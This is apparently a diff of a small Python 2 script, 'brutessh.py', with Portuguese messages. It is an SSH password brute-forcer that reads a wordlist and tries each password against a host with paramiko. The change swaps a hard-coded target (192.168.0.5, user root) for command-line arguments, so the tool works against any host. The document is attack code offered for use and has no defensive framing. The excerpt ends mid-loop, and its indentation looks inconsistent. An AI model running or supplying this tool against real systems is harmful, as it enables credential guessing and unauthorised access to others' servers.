@@ -1,16 +1,21 @@
 #!/usr/bin/python
-import paramiko
+import paramiko,sys
 
-ssh = paramiko.SSHClient()
-ssh.load_system_host_keys()
-ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+if len(sys.argv) != 4:
+	print "Modo de uso: python brutessh.py host user pass.txt"
+	sys.exit()
+else:
 
-f = open('wordlist.txt')
+	ssh = paramiko.SSHClient()
+	ssh.load_system_host_keys()
+	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+f = open(sys.argv[3])
 for palavra in f.readlines():
 	senha = palavra.strip()
 
 	try:
-		ssh.connect('192.168.0.5', username='root', password=senha)
+		ssh.connect(sys.argv[1], username=sys.argv[2], password=senha)
 
 	except paramiko.ssh_exception.AuthenticationException:
 
